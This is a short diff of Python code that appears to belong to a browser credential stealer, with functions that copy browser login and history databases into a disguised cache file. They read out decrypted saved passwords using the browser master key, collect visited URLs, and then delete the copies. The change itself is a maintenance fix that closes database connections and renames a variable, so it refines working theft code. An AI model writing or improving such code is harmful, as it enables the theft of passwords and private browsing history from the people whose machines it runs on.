@@ -142,6 +142,8 @@ def get_login_data(path, master_key, blink = False):
 
             alldatapass = Types.Login(row[0], row[1], decrypted_password)
             logins += str(alldatapass) + "\n"
+
+        conn.close()
         remove(login_db)
     except Exception as e: Log(f"{path} logins ---> {e}")
 
@@ -156,8 +158,8 @@ def get_web_history(path, blink = False):
         HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
         history_db = join(config.pathToLogs, "hwincache.db")
         copy2(join(path, "History"), history_db)
-        c = connect(history_db)
-        cursor = c.cursor()
+        conn = connect(history_db)
+        cursor = conn.cursor()
 
         for result in cursor.execute(HistorySQL).fetchall():
             data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
@@ -167,7 +169,7 @@ def get_web_history(path, blink = False):
                 continue
             history += result + "\n\n"
         
-        c.close()
+        conn.close()
         remove(history_db)
     except Exception as e:
         Log(f"{path} history ---> {e}")
